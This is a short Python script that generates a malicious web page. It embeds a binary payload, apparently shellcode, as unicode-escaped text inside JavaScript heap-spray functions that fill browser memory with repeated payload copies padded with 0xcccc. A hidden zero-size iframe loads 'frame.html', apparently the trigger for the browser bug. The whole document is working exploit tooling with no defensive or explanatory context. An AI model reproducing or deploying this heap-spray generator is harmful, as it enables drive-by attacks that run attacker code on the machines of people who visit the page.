import sys
import struct

html = """<html>
<head>
<script>
    function b(m, s, v) {
        var a = new Array(s - 20);
        nv = v + unescape("%%ucccc");
        for (var j = 0; j < a.length / (v.length / 4); j++) a[j] = nv;
        var t = document.createTextNode(String.fromCharCode.apply(null, new Array(a)));

        m.push(t);
    }

    function a(e) {
        var m = [];

        for (var j = 20; j < 430; j++) {
            b(m, j, unescape("%s"));
        }
    }
</script>
</head>
<body>
        <iframe width=0 height=0 src="frame.html"></iframe>
</body>
</html>"""

with open(sys.argv[2], 'wb') as fout:
    hex_string = ""
    with open(sys.argv[1], 'rb') as fin:
        bytes = fin.read(2)
        while bytes:
            data = struct.unpack('H', bytes)
            hex_string += "\\u{:04x}".format(data[0])
            bytes = fin.read(2)
    fout.write(html % hex_string)
